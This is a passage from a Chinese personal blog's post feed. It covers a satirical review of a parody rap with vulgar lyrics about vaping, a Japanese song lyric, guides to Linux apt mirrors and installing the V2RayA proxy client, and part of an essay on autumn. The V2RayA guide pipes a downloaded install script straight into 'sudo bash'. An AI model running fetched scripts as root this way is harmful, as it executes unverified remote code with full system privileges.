的热评第一便是：“兄弟要是没有做过十几年的卷子，为了生计而奔波拼命，兄弟笑的肯定比他还纯真。”，便可见一斑。</p><blockquote><p><em>脚叫做勾八 八八八八八</em></p><p><em>对你说藏话 啦啦啦啦啦</em></p><p><em>你不会回笼 回家找你妈</em></p><p><em>抽传统香烟 我测你们码</em></p></blockquote><p>此段音律和谐韵味十足，更奠定了人物形象“纯真”的基础。此时 B 站的 MV 中，弹幕无论高级还是普通，忽然变得密集。“藏”同“脏”，什么样的人才会说脏话后恶作剧得逞一般发出嘲讽？自然是初学脏话的儿童，模仿与挑衅，“你能奈我何？”</p><p>确实不能怎样。此丁真非彼丁真，歌曲中的丁真是符号化的丁真，用来消解真正的丁真身上“纯真”的标签，比现实里被众多世俗标签淹没的丁真更丁真。</p><blockquote><p><em>偶尔骑骑小马 理塘走一走</em></p><p><em>随手掏出悦刻 你也来一口</em></p><p><em>哥们不费力 就住进了高楼</em></p><p><em>理塘高速路 都五档起步走</em></p></blockquote><p>骑马、抽烟，住高楼，上高速，多么惬意的生活！而此时，丁真的形象在纯真的藏话里进一步被提纯。“偶尔”、“随手”、“不费力”、“都”，连用四个随意潇洒的词，成功地描绘了丁真成名后的浮夸与“狂”。“哥们不费力，就住进了高楼”，初看无他，但当结合当下，便知其“狂”！现实中，多少人年过花甲依然还着房贷？多少大学生毕业即失业？多少人因为内卷最终不得不返回小县城？一种不满与无奈的情绪交织在一起，歌曲进入下一阶段。</p><blockquote><p><em>去联合国学英文哥们 Let’s go</em></p><p><em>回理塘实践哥们 Let’s 抽</em></p><p><em>哥们哇啦哇啦乱唱听感就拉满了</em></p><p><em>你文化程度再高你也听不懂的</em></p><p><em>感觉这首歌技术不如丁真</em></p><p><em>因为你是肥猪体重要按吨</em></p><p><em>我投资悦刻别他妈倒闭了</em></p><p><em>有烟弹寄一个给礼堂的丁真</em></p></blockquote><p>前两句是丁真在联合国演讲的事件与抽烟事件，攻击性不算高，可能只为叙述与押韵。再后两句亦然，丁真胡言乱语却获得尊重，言语高深无人能懂——等下，“你文化程度再高你也听不懂的”？这何尝不是反讽！前面我们知道，丁真的文化水平不高，按照当时他的水平，怎能说出这样“高深”的话？但全曲以第一人称叙述，问题自然就得到了解答——这恰恰是丁真步步高升之后的轻狂与自傲。而且，这两句直接跨越了听者与歌曲的隔阂，对着歌曲的反对者进行攻击，猝不及防，在全文中是情感递进的重要节点。第五六两句再次发起攻击，七八两句回到丁真身上，流畅丝滑，不显突兀。</p><blockquote><p><em>我特么想抽烟（快给我抽）</em></p><p><em>抽死我个 byd（快给我抽）</em></p><p><em>抽抽抽抽抽抽抽（快给我抽）</em></p><p><em>（快给我抽）</em></p><p><em>（快给我抽）</em></p><p><em>（快给我抽）</em></p><p><em>快给我 快给我 快给我 快给我 我要抽 我要抽 我要抽 我要抽</em></p></blockquote><p>重复的歌词，配合口齿不清的腔调、漏电的烟嗓，这段词是一个“缓冲区”，引导下一段经典的歌词：</p><blockquote><p><em>I GOT 油 我想抽</em></p><p><em>I GOT 油 ALL MY MIND</em></p><p><em>抽不了兜着走</em></p><p><em>走走走走走走走</em></p><p><em>I GOT 油 我想抽</em></p><p><em>I GOT 油 ALL MY MIND</em></p><p><em>抽不了兜着走</em></p><p><em>走走走走走走走</em></p></blockquote><p>这段歌词朗朗上口，易于传唱——这可能也是 IGS 在 B 站、网抑云等平台遭连封多次的原因之一，也恰是它能够传播开来的原因之一。毫不掩饰，直接表达内心的情感；言语纯朴，透着轻狂。这段词在全曲共有重复三段，MV 均为一辆在夜间道路上疾驰的跑车，似乎与前面的“理塘高速路，都五档起步走”相呼应。其所表达，众人各有千秋。余音绕梁，回味无穷。</p><blockquote><p><em>那些说唱，都是一坨屎</em></p><p><em>攻击性没有，词汇还低能的要死</em></p><p><em>但我心怀善念，接纳悦刻五的每个孝子</em></p><p><em>我的回笼技术能够气死那些黑子</em></p><p><em>一眼丁真，鉴定为纯纯的若智</em></p><p><em>牙医丁真，鉴定为纯纯的白齿</em></p><p><em>经过 A 门的时候帮我把烟雾给封死</em></p><p><em>王源不发龙狙证明他并没有素质</em></p></blockquote><p>爽！太爽了！最直白的粗鄙之语背后是最真实的伤害，也是“纯”的体现，不加包装，直抒胸臆。</p><p>是什么让原本纯真的“丁真”如此“狂”，是什么让大家为他的走红感到愤懑？</p><p>词中连用两次的“一眼丁真”梗是当代简中网络不可逾越的一个高峰，它的存在让此曲更接地气，依托于“第一人称”视角，也让其攻击性更强。在丁真成为地方招牌后，一眼丁真文案与表情包，从对社会新闻的调侃到更为广泛的调侃，走出贴吧，飞入寻常百姓家。</p><blockquote><p><em>打完狙我准备骑珍珠去抽一根哦</em></p><p><em>但是珍珠不在了</em></p><p><em>我只能骑着我的纠纠</em></p><p><em>穿越整个四川找悦刻旗舰店</em></p><p><em>为了芋泥啵啵，我抽胖了双脸</em></p><p><em>但是人们依然爱我，爱我纯真双眼</em></p><p><em>为了苦练烟嗓我抽烟好几年</em></p><p><em>现在一唱歌哥们嗓子就漏电</em></p></blockquote><p>第五句起，连破多局；原曲中它第五句起，第一人称接连不断的输出，句句几乎没有停顿。五六两句是丁真“误入歧途”爱上电子烟的描写，其“但是人们依然爱我，爱我纯真双眼”，让人不免想到，公众人物在公共场合应该注意自身形象；可到了丁真身上，一切都听资本的，管它什么勾皮规定——也对，这是官方造星，规则本就官方说了算。</p><blockquote><p><em>我爱抽烟，出生到太平间</em></p><p><em>我爱抽烟，一天十根直到肺病变</em></p><p><em>不要抽，假的烟，不要抽</em></p><p><em>如果你不知道去哪里就来我直播间</em></p><p><em>为了买烟我付出太多</em></p><p><em>没有电子烟的人生就只是片荒漠</em></p><p><em>没有悦刻的人生我也只是个喽啰</em></p><p><em>看到不认识的烟杆我会去抚摸</em></p></blockquote><p>同样的连续输出，表达了丁真对抽烟的喜爱，纵使出生到太平间，纵使肺病变，也不停止；告诉大家，不要抽假烟，其“如果你不知道去哪里就来我直播间”便是引用丁真在直播时抽烟的片段，但此处加以幽默的手法，将其描绘成在直播间推广电子烟，“丁真官方认证”，给此段加上了幽默讽刺。后四句运用了比喻手法，体现电子烟在丁真生活中的重要性，体现丁真可能不止在镜头前抽烟，也体现丁真还有无数不为人知的缺点，却在官方的推动下，胜过无数纯朴的“小镇做题家”，乃至无数普通人。</p><blockquote><p><em>这一段我也不知道我在唱什么</em></p><p><em>也许我也只是溜大了</em></p><p><em>也许我只不过是溜大了</em></p><p><em>就像你的人生糊弄糊弄不就完了么</em></p></blockquote><p>这段看似“不知所云”，实则为第四句嘲弄观众的人生作铺垫。我的成名纯属意外，你的人生尽是混乱。将真实伤害再次狂暴地推向第四面墙外的观众，极尽升华的攻击带来的最纯粹的享受。儿童般毫不掩饰的得意和恶意，在媒体包装下是看不出来的。此曲可谓将这层包装毫不留情地撕下，将聚光灯转向撕开的裂口，让大家更清楚地看见，光鲜亮丽下的丁真。</p><p>结尾再次重复经典唱词，全曲终了。但在 V 的补档中，结尾有所延长，虽无歌词，且看 MV。青黑的滤镜，中央是一团火，火上竹子在燃烧——就这么多，没有别的内容。《三国演义》中有这么一句话：“玉可碎而不可改其白，竹可焚而不可毁其节”。我想，这个结尾，是 V 在多次补档后的“坚定”，是 V 的用户名“V 在燃烧”的体现（此时弹幕出现了一个词：We 在燃烧）。全曲在鼓点与这堆燃烧的竹子中戛然而止。</p><p>——————————</p><p>听罢全曲，感到绕梁三日，回味无穷，余音袅袅，不绝如缕。IGS 的诞生是一场意外，但这场意外造就了一首神曲。</p><p>我的灵魂仿佛受到了神圣的洗涤，好像虔诚的信徒为其高歌。它仿佛达到了，甚至超越了《zood》，成为了下一座高峰。纵使 V 在燃烧随后发布的《理塘 Hood》，也无法将其超越，如同王羲之再难作出《兰亭集序》。</p><p>《zood》只被封一两次，但 IGS 在全网，在半年多时间内被封十余次。这是它的播放量不及《zood》的原因之一，但 IGS 被三番五次的下架封杀，推到了一个新的高度。</p><p>IGS 的爆火，源于荒唐的现实。从丁真入手，不止于丁真。结尾处，丁真成为了一个符号。其讽刺的，不再仅仅是抽电子烟的明星丁真，而是现实中千千万万如丁真一样的，甚至可以说是“名不副实”的资本明星。</p><p>恰到好处的时间，恰到好处的灵感，交织在一起，让 IGS 超越“鬼畜”，成为神作。</p><blockquote><p>“开头丁真骑马那段可以直接爆杀今年国内所有 mv。”</p><p>“配上后面的横幅标语更好笑：鲜衣怒马少年郎，构建社会现代城。”</p><p>“人骨搭台歌功舞，民膏研墨颂德词。”</p><p>“敌人反对了，说明我们做的正确。既然能被下架封杀，说明不仅做的对，还是卓有成效的。”</p><p>“鲜衣怒马少年郎，谁不识我礼堂王！”</p><p>“烟弹入嘴，七分化作雪豹。剩下的三分，啸成了寒芒。比嘴一吐，便是半个理塘。——《忆丁真》”</p><p>dz是被主流媒体和背后的不可言说强推出来的，一个文盲满口藏话却靠“纯真笑容”收获本不该属于他的大富大贵，这就等于公开把传统价值观“努力就有收获”贬得一文不值。而我们更多普通人寒窗苦读18年却要被斥为小镇做题家，而把他们所推崇的dz形象解构就相当于一场赛博反抗，本质上是对其代表的那些德不配位、不公正等现象的不满</p></blockquote><p>参考资料：</p><p><a href="https://www.zhihu.com/question/552690502" rel="external nofollow noreferrer">https://www.zhihu.com/question/552690502</a><br><a href="https://www.zhihu.com/question/555030791" rel="external nofollow noreferrer">https://www.zhihu.com/question/555030791</a></p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>花一匁</title>
      <link href="/posts/952207792/"/>
      <url>/posts/952207792/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><audio src="/attach/%E8%8A%B1%E4%B8%80%E5%8C%81.mp3" controls="controls" controlsList= "nodownload" oncontextmenu= "return false" controls></audio></p><p>【转载自贴吧】</p><p>【播放时请手动关闭左下角的音乐播放器，如果没看到或没播放则不用管】</p><p>一次偶然的机会，听到这首叫做《花一匁》的歌，女声和着风雅的配乐娓娓道来，在轻柔曼妙的旋律中却流淌着无奈的悲凉。花一匁隐射 “卖身的人”，据介绍，这首歌的歌词是根据樋口一叶《青梅竹马》的故事而写的，诉说着明治时代的一段伤感的青春记忆。</p><p>所以，我的毕业论文就打算研究这本小说。这部小说是我觉得继川端康成的《伊豆的舞女》之后表达初恋最纯粹的小说。和尚和雏妓青梅竹马式的朦胧爱恋，看起来荒唐可笑，但是却一如既往地延续了日本人对情感的纯粹的表达：好想告诉你，却无法传达爱。所以，我一直觉得，樋口一叶才是日本动漫的情感表现风格的鼻祖。</p><p>正如泰戈尔的诗所说的：“世界上最遥远的距离，不是生与死的距离，而是我就站在你面前，你却不知道我爱你。世界上最遥远的距离，不是我就站在你面前，你却不知道我爱你，而是爱到痴迷，却不能说我爱你”</p><p>歌词：</p><p>日が暮れる迄 游んだ広场<br>nichi ga kure ru made asonda hiroba<br>今は人影さえ见えず<br>ima ha hitokage sae mie zu<br>人形抱えた 贵方と呗う<br>ningyou dae ta anata to utau<br>呗を一人 口ずさむ<br>uta wo hitori kuchi zusamu</p><p>时は过ぎ去り いつしか贵方<br>toki ha sugi sari itsushika anata<br>何処か远くに 思えて<br>doko ka tooku ni omoe te<br>七月十月 昔の日々が<br>shichigatsu juugatsu mukashi no hibi ga<br>思い出へと 姿を変える<br>omoide heto sugata wo kae ru</p><p>昔游んだ 华一匁<br>mukashi asonda hana ichi monme<br>无邪気な笑颜に 想いを寄せて<br>mujaki na egao ni omoi wo yose te<br>あの子が欲しい あの子が居ない<br>ano ko ga hoshii ano ko ga ina i<br>花びら舞う 风に消えた<br>hanabira mau kaze ni kie ta</p><p>结い上げた髪 口に红注し<br>yui age ta kami kuchi ni kurenai sashi<br>面影微かに 残しつつ<br>omokage kasuka ni nokoshi tsutsu<br>頬に一粒 泪はらり<br>hoo ni hitotsubu namida harari<br>最后の约束 络めた小指<br>saigo no yakusoku karame ta koyubi</p><p>手を繋いで 通った小道<br>te wo tsunai de kayotta komichi<br>今も 贵方 覚えてますか<br>ima mo anata oboe temasuka<br>あの子が欲しい あの子が居ない<br>ano ko ga hoshii ano ko ga ina i<br>思い出の中 微笑む二人<br>omoide no naka hohoemu futari</p><p>昔游んだ 华一匁<br>mukashi asonda hana ichi monme<br>无邪気な笑颜に 想いを寄せて<br>mujaki na egao ni omoi wo yose te<br>あの子が欲しい あの子が居ない<br>ano ko ga hoshii ano ko ga ina i<br>花びら舞う 风に消えた<br>hanabira mau kaze ni kie ta</p><p>窓に一轮 水仙の华<br>mado ni ichirin suisen no hana<br>约束交わした 华一匁<br>yakusoku majiwa shita hana ichi monme</p><p>【我到现在也不知道此歌作者是谁，出处更是未搜索到，只在几年前的贴吧有幸见到大佬介绍。音频是在另一个博客上听到，遂保存下来。翻阅帖子，看到楼主回复另一层楼时提到这首是“一首同人歌曲，叫华一匁，演唱是 KEI，唯美和风歌曲第九集”；但现在网上关于这首歌的信息不多（有些是同名但不同旋律），一些平台上只有翻唱版……】</p>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 更新软件源</title>
      <link href="/posts/86863163/"/>
      <url>/posts/86863163/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>由于国内网络众所周知的原因，使用 Linux 系统 默认软件源速度很慢，故建议配置国内镜像。</p><p>以 Ubuntu 系统为例，登入系统，打开终端并切换到 root 用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>备份原来的源：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure><p>打开/etc/apt/sources.list 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>此时进入 vim 模式，可对 sources.list 进行编辑</p><p>按 i 进入编辑模式，官方源前加“#”，将国内源粘贴至其下方。完成后按下 ESC 退出编辑，输入“:wq”保存。</p><p>更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update # 更新源</span><br><span class="line">sudo apt-get upgrade # 更新软件</span><br><span class="line">sudo apt-get dist-upgrade</span><br><span class="line">sudo apt-get clean</span><br><span class="line">sudo apt-get autoclean</span><br></pre></td></tr></table></figure><p>如出现依赖问题可输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -f install</span><br></pre></td></tr></table></figure><blockquote><p>注：执行多个命令时，使用&amp;&amp;符号则代表前一个命令执行成功，后一个才执行；使用||符号则前一个命令执行失败，后一个才执行；使用；符号则无论前一个命令是否成功，后面均会执行。</p></blockquote><hr><p>附：</p><p>中国 Linux 源镜像站大全：<a href="https://www.cnblogs.com/Hi-blog/p/Linux-Mirror-Sites.html" rel="external nofollow noreferrer">https://www.cnblogs.com/Hi-blog/p/Linux-Mirror-Sites.html</a></p><p>Ubuntu 镜像源</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#添加阿里源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">#添加清华源</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse</span><br></pre></td></tr></table></figure><p>Kali Linux 镜像源：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#浙大</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 安装 V2-Ray</title>
      <link href="/posts/117984481/"/>
      <url>/posts/117984481/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><font color="red">本文仅供技术研究学习使用，严禁将此类工具和服务用于涉政、暴恐等违法、灰色目的，否则后果自负。</font></p><h2 id="安装">安装</h2><p>Linux 系统下常用的 V2-Ray 版本是 V2RayA，访问其在 GitHub 上的仓库：<a href="https://github.com/v2rayA/v2rayA" rel="external nofollow noreferrer" title="https://github.com/v2rayA/v2rayA">https://github.com/v2rayA/v2rayA</a>。</p><p>如果你使用了带有图形化界面的 V2-Ray，还可以使用 <a href="https://github.com/2dust/v2rayN" rel="external nofollow noreferrer">V2RayN</a>。</p><h3 id="安装-V2-Ray-内核">安装 V2-Ray 内核</h3><p>安装 V2-Ray 内核，可使用其提供的镜像脚本</p><p><code>curl -ls https://mirrors.v2raya.org/go.sh | sudo bash</code></p><p>安装后可以关掉服务，V2RayA 不依赖该服务</p><p><code>sudo systemctl disable v2ray --now ### Xray 需要替换服务为 xray</code></p><h3 id="安装主程序">安装主程序</h3><p>添加公钥</p><p><code>wget -qO - https://apt.v2raya.mzz.pub/key/public-key.asc | sudo apt-key add -</code></p><p>添加 V2RayA 软件源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;deb https://apt.v2raya.mzz.pub/ v2raya main&quot; | sudo tee</span><br><span class="line">/etc/apt/sources.list.d/v2raya.list</span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h3 id="安装-V2RayA">安装 V2RayA</h3><p>v2rayA 主要提供了下述使用方法：</p><ol><li>从 APT 软件源或者 AUR 安装</li><li>Docker</li><li>自建 scoop bucket (Windows 用户）</li><li>自建 homebrew tap</li><li>自建 OpenWrt 仓库 和 OpenWrt 官方软件源（从 OpenWrt 22.03 版本开始提供）</li><li>微软 winget: <a href="https://winstall.app/apps/v2rayA.v2rayA" rel="external nofollow noreferrer">https://winstall.app/apps/v2rayA.v2rayA</a></li><li>Ubuntu Snap: <a href="https://snapcraft.io/v2raya" rel="external nofollow noreferrer">https://snapcraft.io/v2raya</a></li><li>从 GitHub releases 下载二进制与安装包<br>详见 <a href="https://v2raya.org/docs/prologue/introduction/" rel="external nofollow noreferrer">v2rayA - Docs</a></li></ol><p><code>sudo apt install v2raya</code></p><p>如果你提前准备好 deb 包，那么问题就变得简单了。把你准备好的包丢进 Linux 文件系统里，然后在终端输入：</p><p><code>sudo apt install 「此处替换为你放入的 deb 包的目录」</code></p><h3 id="kali-安装-V2RayA">kali 安装 V2RayA</h3><p><a href="https://github.com/DGitHub-Creator/kali-Linux-v2rayA" rel="external nofollow noreferrer" title="https://github.com/DGitHub-Creator/kali-Linux-v2rayA">https://github.com/DGitHub-Creator/kali-Linux-v2rayA</a></p><p>内核安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://cdn.jsdelivr.net/gh/v2rayA/v2rayA@master/install/go.sh</span><br><span class="line">sudo bash go.sh</span><br><span class="line">wget -qO - https://&lt;span&gt;&lt;/span&gt;apt.v2raya.mzz.pub/key/public-key.asc | sudo apt-key add - ### 添加公钥</span><br><span class="line">echo &quot;deb https://apt.v2raya.mzz.pub/ v2raya main&quot; | sudo tee</span><br><span class="line">/etc/apt/sources.list.d/v2raya.list ### 软件源</span><br><span class="line">sudo apt update</span><br><span class="line">安装 v2rayA：sudo apt install v2raya</span><br></pre></td></tr></table></figure><p>或者从别处下载完后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install 「deb 文件所在路径」</span><br><span class="line">systemctl start v2raya.service</span><br></pre></td></tr></table></figure><p>又或者是这个：<a href="https://www.bbsmax.com/A/VGzlnbG75b/" rel="external nofollow noreferrer" title="https://www.bbsmax.com/A/VGzlnbG75b/">https://www.bbsmax.com/A/VGzlnbG75b/</a></p><h2 id="如何使用">如何使用</h2><p>由于 Windows 版配置文件内容与 Linux 版本相比大差不差，故请自行搜索配置写法。不嫌麻烦的可以</p><p>在 Windows 系统下先安装个 V2RayN 并正常使用后导出配置丢到 Linux 系统下/etc/v2ray/目录里的配置文件中去。如果已经启动服务，请在终端输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service v2ray stop</span><br><span class="line">sudo service v2ray start</span><br></pre></td></tr></table></figure><p>由于 1.5 版本不再默认 V2RayA 自启动，故须执行下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start v2raya.service ### 启动 v2rayA</span><br><span class="line">sudo systemctl enable v2raya.service ### 设置开机自动启动</span><br></pre></td></tr></table></figure><p>之后可使用浏览器访问 127.0.0.1:2017 以访问，非本机如何访问不必多说，自己去看 Linux 系统在内网中分配的地址。以访问，非本机如何访问不必多说，自己去看 Linux 系统在内网中分配的地址。</p><p>进入后你会知道怎么做的。</p><p>忘了密码请在终端输入：<br><code>sudo v2raya --reset-password</code></p><p>参考文档：</p><ul><li><a href="https://github.com/DGitHub-Creator/kali-Linux-v2rayA" rel="external nofollow noreferrer">https://github.com/DGitHub-Creator/kali-Linux-v2rayA</a></li><li><a href="https://www.bbsmax.com/A/VGzlnbG75b/" rel="external nofollow noreferrer">https://www.bbsmax.com/A/VGzlnbG75b/</a></li><li><a href="https://zhuanlan.zhihu.com/p/414998586" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/414998586</a></li><li><a href="https://be-my-only.xyz/blog/v2ray-linux-client-setting/index.html" rel="external nofollow noreferrer">https://be-my-only.xyz/blog/v2ray-linux-client-setting/index.html</a></li><li><a href="https://kylebing.cn/readme/docs/v2ray/v2ray%20%E5%AE%A2%E6%88%B7%E7%AB%AF%20Linux/" rel="external nofollow noreferrer">https://kylebing.cn/readme/docs/v2ray/v2ray%20%E5%AE%A2%E6%88%B7%E7%AB%AF%20Linux/</a></li><li><a href="https://fengwenhua.github.io/2020/01/27/kali-an-zhuang-v2ray/#!" rel="external nofollow noreferrer">https://fengwenhua.github.io/2020/01/27/kali-an-zhuang-v2ray/#!</a></li><li><a href="https://github.com/v2rayA/v2rayA/wiki/%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/7cd677a6c7401c8a092baa1ae63b96528b96a1f1" rel="external nofollow noreferrer">https://github.com/v2rayA/v2rayA/wiki/%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/7cd677a6c7401c8a092baa1ae63b96528b96a1f1</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>秋风，唱给自然动听的歌</title>
      <link href="/posts/348141877/"/>
      <url>/posts/348141877/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>秋风轻拂着光阴的琴弦，用桂花的芬芳、苹果的馨香、菊花的灿烂、牵牛花的奔放、一串红的艳丽，将广袤的乡野演绎得如诗如画，勾勒出大自然的宏伟壮丽，阳刚之美尽显。</p><p>刚刚告别酷热的夏日，秋风婀娜地舞动着长袖，牵着节气的手，奏响了时光的华彩乐章。它用变幻神奇的旋律，用动听的音符，轻拂白云，细述云蒸霞蔚，仙女舞袖，碧波荡漾。万鸟纷纷飞往银河，筑起了牛郎织女相会的鹊桥，为这对鸳鸯倾诉着夜晚的私语。</p><p>秋风既成熟又高雅。砍高粱、掐谷子、掰玉米、刨芋头，割豆子、下苹果、晒柿子、揪石榴、摘花生、耩麦子。它用一串串音符演奏着乡村的生活，每一个音符都是秋风的乐章，婉转动人。仰望湛蓝的天空，沉闷枯燥的苦闷烟消云散，心情舒畅，激情如火，热爱蓝天、热爱自然。</p><p>秋风轻拂，化作一曲多情的诗篇，唤醒了花朵的柔情。远山间的公园，点缀着各种娇小的花朵，仿佛是一幅五彩斑斓的画卷，在一夜之间绽放出绚丽多彩的色彩，宛如一幅美丽的画卷，芳香四溢，扑鼻而来。宛如绯红的山丹丹花在天空中绽放，红彤彤的色彩映照着天空，清香弥漫在空气中，吸引着萤火虫在山野荒原间翩翩起舞。此时，小鸟们不再在花丛中嬉戏，小羊们也不忍心动口去啃食。菊花顶住尘土的飞扬，不顾凋谢的寂寞，勇敢地承受干旱的折磨，在秋风的寂寞和冷落中，勇敢地绽放出美丽的花朵。</p><p>秋风在山野田园中静静地流淌，使得整个环境变得宁静而祥和。鸟儿们歌声婉转悠扬，小溪仿佛是一条轻纱，静静地流淌，就像是一位少女的歌声，宁静而宜人。夜色如水，清凉而宁静，牛郎织女星在夜空中闪耀着，像是天阶上的明珠。秋风轻轻地吹拂着月亮，仿佛是在吹奏着思恋的洞箫，美丽的月亮高高地挂在天空中，倾诉着心中的珍藏。</p><p>秋风轻拂着大地，带来一阵清凉。细小的树叶被轻轻吹动，仿佛在跳着欢快的舞蹈。远处的山峦静静地依偎在云雾中，苍翠的树林为其增添了一抹神秘的色彩。阳光透过云层的缝隙洒在大地上，犹如一颗金色的宝石，熠熠生